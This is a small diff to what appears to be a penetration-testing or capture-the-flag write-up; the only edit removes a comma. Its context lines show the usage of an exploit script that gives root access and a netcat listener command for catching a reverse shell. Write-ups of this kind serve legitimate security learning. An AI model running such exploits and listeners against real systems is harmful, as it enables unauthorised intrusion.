@@ -93,7 +93,7 @@ $ python2 usermap_script.py
 [-] usage: python usermap_script.py <RHOST> <RPORT> <LHOST> <LPORT>
 ```
 
-The script is very easy to use, and immediately provides us with `root` access to the box.
+The script is very easy to use and immediately provides us with `root` access to the box.
 
 ```
 $ nc -lvnp 8008
